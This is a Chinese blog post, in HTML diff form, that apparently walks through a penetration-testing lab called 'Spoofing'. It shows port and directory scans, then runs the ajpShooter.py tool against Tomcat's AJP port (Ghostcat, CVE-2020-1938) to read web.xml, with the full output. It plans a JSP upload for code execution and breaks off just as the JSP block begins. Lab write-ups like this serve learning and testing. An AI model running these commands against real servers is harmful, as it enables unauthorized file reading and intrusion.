@@ -1,0 +1,1448 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Spoofing 参考：春秋云境·Spoofing – fushulingのblog\n信息收集\n1 2 3 4 5 6 39.99.253.112:8080 open 39.99.253.112:8009 open 39.99.253.112:22 open [*] alive ports len is: 3 start vulscan [*] WebTitle http://39.99.253.112:8080 code:200 len:7091 title:后台管理 没东西只有8080端口做了开着web服务\n"><title>Spoofing</title><link rel=canonical href=https://0d000721999.github.io/p/spoofing/><link rel=stylesheet href=/scss/style.min.e8f9fb65172830b7456cc8f040d4bbb0a7691d6eaa1e581f17d264a13d1d48d4.css><meta property='og:title' content="Spoofing"><meta property='og:description' content="Spoofing 参考：春秋云境·Spoofing – fushulingのblog\n信息收集\n1 2 3 4 5 6 39.99.253.112:8080 open 39.99.253.112:8009 open 39.99.253.112:22 open [*] alive ports len is: 3 start vulscan [*] WebTitle http://39.99.253.112:8080 code:200 len:7091 title:后台管理 没东西只有8080端口做了开着web服务\n"><meta property='og:url' content='https://0d000721999.github.io/p/spoofing/'><meta property='og:site_name' content='美咕噜的小站'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='打靶'><meta property='article:tag' content='渗透'><meta property='article:published_time' content='2026-08-23T00:00:00+00:00'><meta property='article:modified_time' content='2026-08-23T00:00:00+00:00'><meta property='og:image' content='https://0d000721999.github.io/p/spoofing/1_hu_203d9d8a2ad4c602.webp'><meta name=twitter:title content="Spoofing"><meta name=twitter:description content="Spoofing 参考：春秋云境·Spoofing – fushulingのblog\n信息收集\n1 2 3 4 5 6 39.99.253.112:8080 open 39.99.253.112:8009 open 39.99.253.112:22 open [*] alive ports len is: 3 start vulscan [*] WebTitle http://39.99.253.112:8080 code:200 len:7091 title:后台管理 没东西只有8080端口做了开着web服务\n"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://0d000721999.github.io/p/spoofing/1_hu_203d9d8a2ad4c602.webp'><link rel="shortcut icon" href=/favicon.ico><link rel=preload href=/font/SeriousShannsNerdFontMono-Regular.bb31bd214d39201a3b7c975bff8d7d28aea776ea8f432b538b7e79013af419fc.woff2 as=font type=font/woff2 crossorigin><style>@font-face{font-family:blogmono;src:url(/font/SeriousShannsNerdFontMono-Regular.bb31bd214d39201a3b7c975bff8d7d28aea776ea8f432b538b7e79013af419fc.woff2)format("woff2");font-display:swap;font-style:normal;font-weight:400}body{background-color:#f3eeee;background-image:linear-gradient(rgba(255,255,255,.16),rgba(255,255,255,.16)),url(/background/1_hu_5012b4e0f83d2384.c8c1acd7eaca2e2d02130c7c020ff283d01dbcc672cf5f750be3a8bdb2bb246e.webp);background-repeat:no-repeat;background-position:50% 0;background-size:cover;background-attachment:fixed}@media(max-width:767px){body{background-image:linear-gradient(rgba(255,255,255,.24),rgba(255,255,255,.24)),url(/background/1_hu_de1ff494d38eb06b.adf00830bddcc1b219db2ff10dd9314f66e7f5e8dcbfce28404699e20b44b9fb.webp);background-attachment:scroll}}@media(prefers-reduced-motion:reduce){body{background-attachment:scroll}}</style></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.setItem(e,"light")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_cc7d4f5d18fa2884.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>😋</span></figure><div class=site-meta><h1 class=site-name><a href=/>美咕噜的小站</a></h1><h2 class=site-description>Ciallo～(∠・ω&lt; )⌒★</h2></div></header><ol class=menu-social><li><a href=https://buuoj.cn/users/175721 target=_blank title=BUUOJ rel=me><svg class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M7 20V4h6a4 4 0 010 8 4 4 0 010 8H7"/><line x1="7" y1="12" x2="13" y2="12"/></svg></a></li><li><a href=https://github.com/0d000721999 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>主页</span></a></li><li><a href=/%E5%85%B3%E4%BA%8E/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>关于</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>归档</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>搜索</span></a></li><li><a href=/friends/><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
+<span>友链</span></a></li><li><a href=/%E9%93%BE%E6%8E%A5/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>链接</span></a></li><li class=menu-bottom-section><ol class=menu></ol></li></ol></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/spoofing/><img src=/p/spoofing/1_hu_8d583435591bee51.webp srcset="/p/spoofing/1_hu_8d583435591bee51.webp 800w, /p/spoofing/1_hu_203d9d8a2ad4c602.webp 1600w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" width=800 height=606 loading=eager decoding=async fetchpriority=high alt=文章封面：Spoofing></a></div><div class=article-details><header class=article-category><a href=/categories/%E5%88%B7%E9%A2%98%E6%89%93%E9%9D%B6/ style=background-color:#264653;color:#fff>刷题&&打靶</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/spoofing/>Spoofing</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>2026-08-23</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>阅读时长: 16 分钟</time></div></footer></div></header><section class=article-content><h1 id=spoofing>Spoofing</h1><p>参考：<a class=link href=https://fushuling.com/index.php/2023/10/14/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7spoofing/ target=_blank rel=noopener>春秋云境·Spoofing – fushulingのblog</a></p><p>信息收集</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>39.99.253.112:8080 open
+</span></span><span class=line><span class=cl>39.99.253.112:8009 open
+</span></span><span class=line><span class=cl>39.99.253.112:22 open
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> alive ports len is: <span class=m>3</span>
+</span></span><span class=line><span class=cl>start vulscan
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://39.99.253.112:8080 code:200 len:7091   title:后台管理
+</span></span></code></pre></td></tr></table></div></div><p>没东西只有8080端口做了开着web服务</p><p>扫一下目录</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>20:44:44<span class=o>]</span> <span class=m>200</span> -   114B - /404.html
+</span></span><span class=line><span class=cl><span class=o>[</span>20:44:44<span class=o>]</span> <span class=m>200</span> -    7KB - /<span class=p>;</span>login/
+</span></span><span class=line><span class=cl><span class=o>[</span>20:44:44<span class=o>]</span> <span class=m>200</span> -    7KB - /<span class=p>;</span>admin/
+</span></span><span class=line><span class=cl><span class=o>[</span>20:44:44<span class=o>]</span> <span class=m>200</span> -    7KB - /<span class=p>;</span>json/
+</span></span><span class=line><span class=cl><span class=o>[</span>20:45:04<span class=o>]</span> <span class=m>200</span> -    7KB - /console.html
+</span></span><span class=line><span class=cl><span class=o>[</span>20:45:05<span class=o>]</span> <span class=m>302</span> -     0B - /css  -&gt;  /css/
+</span></span><span class=line><span class=cl><span class=o>[</span>20:45:05<span class=o>]</span> <span class=m>302</span> -     0B - /data  -&gt;  /data/
+</span></span><span class=line><span class=cl><span class=o>[</span>20:45:07<span class=o>]</span> <span class=m>302</span> -     0B - /docs  -&gt;  /docs/
+</span></span><span class=line><span class=cl><span class=o>[</span>20:45:07<span class=o>]</span> <span class=m>200</span> -   17KB - /docs/
+</span></span><span class=line><span class=cl><span class=o>[</span>20:45:07<span class=o>]</span> <span class=m>200</span> -   132B - /download/
+</span></span><span class=line><span class=cl><span class=o>[</span>20:45:07<span class=o>]</span> <span class=m>302</span> -     0B - /download  -&gt;  /download/
+</span></span><span class=line><span class=cl><span class=o>[</span>20:45:09<span class=o>]</span> <span class=m>200</span> -    1KB - /examples/
+</span></span><span class=line><span class=cl><span class=o>[</span>20:45:09<span class=o>]</span> <span class=m>302</span> -     0B - /examples  -&gt;  /examples/
+</span></span><span class=line><span class=cl><span class=o>[</span>20:45:09<span class=o>]</span> <span class=m>200</span> -    6KB - /examples/servlets/index.html
+</span></span><span class=line><span class=cl><span class=o>[</span>20:45:09<span class=o>]</span> <span class=m>200</span> -   687B - /examples/jsp/snp/snoop.jsp
+</span></span><span class=line><span class=cl><span class=o>[</span>20:45:09<span class=o>]</span> <span class=m>200</span> -   14KB - /examples/jsp/index.html
+</span></span><span class=line><span class=cl><span class=o>[</span>20:45:09<span class=o>]</span> <span class=m>200</span> -   860B - /examples/servlets/servlet/RequestHeaderExample
+</span></span><span class=line><span class=cl><span class=o>[</span>20:45:09<span class=o>]</span> <span class=m>200</span> -   658B - /examples/servlets/servlet/CookieExample
+</span></span><span class=line><span class=cl><span class=o>[</span>20:45:09<span class=o>]</span> <span class=m>200</span> -    1KB - /examples/websocket/index.xhtml
+</span></span><span class=line><span class=cl><span class=o>[</span>20:45:12<span class=o>]</span> <span class=m>403</span> -    3KB - /host-manager/html
+</span></span><span class=line><span class=cl><span class=o>[</span>20:45:12<span class=o>]</span> <span class=m>403</span> -    3KB - /host-manager/
+</span></span><span class=line><span class=cl><span class=o>[</span>20:45:13<span class=o>]</span> <span class=m>302</span> -     0B - /images  -&gt;  /images/
+</span></span><span class=line><span class=cl><span class=o>[</span>20:45:14<span class=o>]</span> <span class=m>200</span> -    7KB - /index.html
+</span></span><span class=line><span class=cl><span class=o>[</span>20:45:15<span class=o>]</span> <span class=m>302</span> -     0B - /js  -&gt;  /js/
+</span></span><span class=line><span class=cl><span class=o>[</span>20:45:16<span class=o>]</span> <span class=m>302</span> -     0B - /lib  -&gt;  /lib/
+</span></span><span class=line><span class=cl><span class=o>[</span>20:45:18<span class=o>]</span> <span class=m>302</span> -     0B - /manager  -&gt;  /manager/
+</span></span><span class=line><span class=cl><span class=o>[</span>20:45:38<span class=o>]</span> <span class=m>200</span> -    9KB - /user.html
+</span></span></code></pre></td></tr></table></div></div><p>访问/;admin/功能点基本都是404，访问docs出现一个tomcat界面</p><p><img src=/p/spoofing/image-20260823204842103_hu_a8cbb1271b4daf48.webp width=1024 height=550 srcset="/p/spoofing/image-20260823204842103_hu_f0777ae65913001e.webp 480w, /p/spoofing/image-20260823204842103_hu_a8cbb1271b4daf48.webp 1024w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/spoofing/image-20260823204842103_hu_b6e9a43f541d6f74.webp data-full-width=1600 data-full-height=859 loading=lazy decoding=async alt=image-20260823204842103 class=gallery-image data-flex-grow=186 data-flex-basis=446px></p><p>Tomcat 9.0.30打CVE-2020-1938，可以做到任意文件读取/包含</p><p>原理是Tomcat默认在<code>server.xml</code>中开启<strong>AJP</strong>协议端口（默认8009），用于与其他Web服务器（如Apache HTTPD）通信。也就是上面扫出来的端口</p><p><a class=link href=https://github.com/00theway/Ghostcat-CNVD-2020-10487 target=_blank rel=noopener>GitHub - 00theway/Ghostcat-CNVD-2020-10487: Ghostcat read file/code execute,CNVD-2020-10487(CVE-2020-1938) · GitHub</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python ajpShooter.py http://39.99.253.112:8080/ <span class=m>8009</span> /WEB-INF/web.xml <span class=nb>read</span>
+</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\1</span>0086<span class=se>\D</span>ownloads<span class=se>\G</span>hostcat-CNVD-2020-10487-master<span class=se>\G</span>hostcat-CNVD-2020-10487-master<span class=se>\a</span>jpShooter.py:363: SyntaxWarning: invalid escape sequence <span class=s1>&#39;\ &#39;</span>
+</span></span><span class=line><span class=cl>  /_<span class=se>\ </span> <span class=o>(</span>_<span class=o>)</span>_ __   / _<span class=se>\ </span><span class=p>|</span>__   ___   ___ <span class=p>|</span> <span class=p>|</span>_ ___ _ __
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>       _    _         __ _                 _
+</span></span><span class=line><span class=cl>      /_<span class=se>\ </span> <span class=o>(</span>_<span class=o>)</span>_ __   / _<span class=se>\ </span><span class=p>|</span>__   ___   ___ <span class=p>|</span> <span class=p>|</span>_ ___ _ __
+</span></span><span class=line><span class=cl>     //_<span class=se>\\</span> <span class=p>|</span> <span class=p>|</span> <span class=s1>&#39;_ \  \ \| &#39;</span>_ <span class=se>\ </span>/ _ <span class=se>\ </span>/ _ <span class=se>\|</span> __/ _ <span class=se>\ </span><span class=err>&#39;</span>__<span class=p>|</span>
+</span></span><span class=line><span class=cl>    /  _  <span class=se>\|</span> <span class=p>|</span> <span class=p>|</span>_<span class=o>)</span> <span class=p>|</span> _<span class=se>\ \ </span><span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=o>(</span>_<span class=o>)</span> <span class=p>|</span> <span class=o>(</span>_<span class=o>)</span> <span class=p>|</span> <span class=o>||</span>  __/ <span class=p>|</span>
+</span></span><span class=line><span class=cl>    <span class=se>\_</span>/ <span class=se>\_</span>// <span class=p>|</span> .__/  <span class=se>\_</span>_/_<span class=p>|</span> <span class=p>|</span>_<span class=p>|</span><span class=se>\_</span>__/ <span class=se>\_</span>__/ <span class=se>\_</span>_<span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span>
+</span></span><span class=line><span class=cl>         <span class=p>|</span>__/<span class=p>|</span>_<span class=p>|</span>
+</span></span><span class=line><span class=cl>                                                00theway,just <span class=k>for</span> <span class=nb>test</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>&lt;<span class=o>]</span> <span class=m>200</span> <span class=m>200</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>&lt;<span class=o>]</span> Accept-Ranges: bytes
+</span></span><span class=line><span class=cl><span class=o>[</span>&lt;<span class=o>]</span> ETag: W/<span class=s2>&#34;2489-1670857638305&#34;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>&lt;<span class=o>]</span> Last-Modified: Mon, <span class=m>12</span> Dec <span class=m>2022</span> 15:07:18 GMT
+</span></span><span class=line><span class=cl><span class=o>[</span>&lt;<span class=o>]</span> Content-Type: application/xml
+</span></span><span class=line><span class=cl><span class=o>[</span>&lt;<span class=o>]</span> Content-Length: <span class=m>2489</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&lt;!DOCTYPE web-app PUBLIC
+</span></span><span class=line><span class=cl> <span class=s2>&#34;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&#34;</span>
+</span></span><span class=line><span class=cl> <span class=s2>&#34;http://java.sun.com/dtd/web-app_2_3.dtd&#34;</span> &gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&lt;web-app&gt;
+</span></span><span class=line><span class=cl>  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  &lt;security-constraint&gt;
+</span></span><span class=line><span class=cl>    &lt;display-name&gt;Tomcat Server Configuration Security Constraint&lt;/display-name&gt;
+</span></span><span class=line><span class=cl>    &lt;web-resource-collection&gt;
+</span></span><span class=line><span class=cl>      &lt;web-resource-name&gt;Protected Area&lt;/web-resource-name&gt;
+</span></span><span class=line><span class=cl>      &lt;url-pattern&gt;/upload/*&lt;/url-pattern&gt;
+</span></span><span class=line><span class=cl>    &lt;/web-resource-collection&gt;
+</span></span><span class=line><span class=cl>    &lt;auth-constraint&gt;
+</span></span><span class=line><span class=cl>      &lt;role-name&gt;admin&lt;/role-name&gt;
+</span></span><span class=line><span class=cl>    &lt;/auth-constraint&gt;
+</span></span><span class=line><span class=cl>  &lt;/security-constraint&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  &lt;error-page&gt;
+</span></span><span class=line><span class=cl>    &lt;error-code&gt;404&lt;/error-code&gt;
+</span></span><span class=line><span class=cl>    &lt;location&gt;/404.html&lt;/location&gt;
+</span></span><span class=line><span class=cl>  &lt;/error-page&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  &lt;error-page&gt;
+</span></span><span class=line><span class=cl>    &lt;error-code&gt;403&lt;/error-code&gt;
+</span></span><span class=line><span class=cl>    &lt;location&gt;/error.html&lt;/location&gt;
+</span></span><span class=line><span class=cl>  &lt;/error-page&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  &lt;error-page&gt;
+</span></span><span class=line><span class=cl>    &lt;exception-type&gt;java.lang.Throwable&lt;/exception-type&gt;
+</span></span><span class=line><span class=cl>    &lt;location&gt;/error.html&lt;/location&gt;
+</span></span><span class=line><span class=cl>  &lt;/error-page&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  &lt;servlet&gt;
+</span></span><span class=line><span class=cl>    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;
+</span></span><span class=line><span class=cl>    &lt;servlet-class&gt;com.example.HelloServlet&lt;/servlet-class&gt;
+</span></span><span class=line><span class=cl>  &lt;/servlet&gt;
+</span></span><span class=line><span class=cl>  &lt;servlet-mapping&gt;
+</span></span><span class=line><span class=cl>    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;
+</span></span><span class=line><span class=cl>    &lt;url-pattern&gt;/HelloServlet&lt;/url-pattern&gt;
+</span></span><span class=line><span class=cl>  &lt;/servlet-mapping&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  &lt;servlet&gt;
+</span></span><span class=line><span class=cl>    &lt;display-name&gt;LoginServlet&lt;/display-name&gt;
+</span></span><span class=line><span class=cl>    &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt;
+</span></span><span class=line><span class=cl>    &lt;servlet-class&gt;com.example.LoginServlet&lt;/servlet-class&gt;
+</span></span><span class=line><span class=cl>  &lt;/servlet&gt;
+</span></span><span class=line><span class=cl>  &lt;servlet-mapping&gt;
+</span></span><span class=line><span class=cl>    &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt;
+</span></span><span class=line><span class=cl>    &lt;url-pattern&gt;/LoginServlet&lt;/url-pattern&gt;
+</span></span><span class=line><span class=cl>  &lt;/servlet-mapping&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  &lt;servlet&gt;
+</span></span><span class=line><span class=cl>    &lt;display-name&gt;RegisterServlet&lt;/display-name&gt;
+</span></span><span class=line><span class=cl>    &lt;servlet-name&gt;RegisterServlet&lt;/servlet-name&gt;
+</span></span><span class=line><span class=cl>    &lt;servlet-class&gt;com.example.RegisterServlet&lt;/servlet-class&gt;
+</span></span><span class=line><span class=cl>  &lt;/servlet&gt;
+</span></span><span class=line><span class=cl>  &lt;servlet-mapping&gt;
+</span></span><span class=line><span class=cl>    &lt;servlet-name&gt;RegisterServlet&lt;/servlet-name&gt;
+</span></span><span class=line><span class=cl>    &lt;url-pattern&gt;/RegisterServlet&lt;/url-pattern&gt;
+</span></span><span class=line><span class=cl>  &lt;/servlet-mapping&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  &lt;servlet&gt;
+</span></span><span class=line><span class=cl>    &lt;display-name&gt;UploadTestServlet&lt;/display-name&gt;
+</span></span><span class=line><span class=cl>    &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;
+</span></span><span class=line><span class=cl>    &lt;servlet-class&gt;com.example.UploadTestServlet&lt;/servlet-class&gt;
+</span></span><span class=line><span class=cl>  &lt;/servlet&gt;
+</span></span><span class=line><span class=cl>  &lt;servlet-mapping&gt;
+</span></span><span class=line><span class=cl>    &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;
+</span></span><span class=line><span class=cl>    &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt;
+</span></span><span class=line><span class=cl>  &lt;/servlet-mapping&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  &lt;servlet&gt;
+</span></span><span class=line><span class=cl>    &lt;display-name&gt;DownloadFileServlet&lt;/display-name&gt;
+</span></span><span class=line><span class=cl>    &lt;servlet-name&gt;DownloadFileServlet&lt;/servlet-name&gt;
+</span></span><span class=line><span class=cl>    &lt;servlet-class&gt;com.example.DownloadFileServlet&lt;/servlet-class&gt;
+</span></span><span class=line><span class=cl>  &lt;/servlet&gt;
+</span></span><span class=line><span class=cl>  &lt;servlet-mapping&gt;
+</span></span><span class=line><span class=cl>    &lt;servlet-name&gt;DownloadFileServlet&lt;/servlet-name&gt;
+</span></span><span class=line><span class=cl>    &lt;url-pattern&gt;/DownloadServlet&lt;/url-pattern&gt;
+</span></span><span class=line><span class=cl>  &lt;/servlet-mapping&gt;
+</span></span><span class=line><span class=cl>&lt;/web-app&gt;
+</span></span></code></pre></td></tr></table></div></div><p>有个UploadServlet和DownloadServlet路由，那就可以上传jsp，利用工具的文件包含rce</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;%
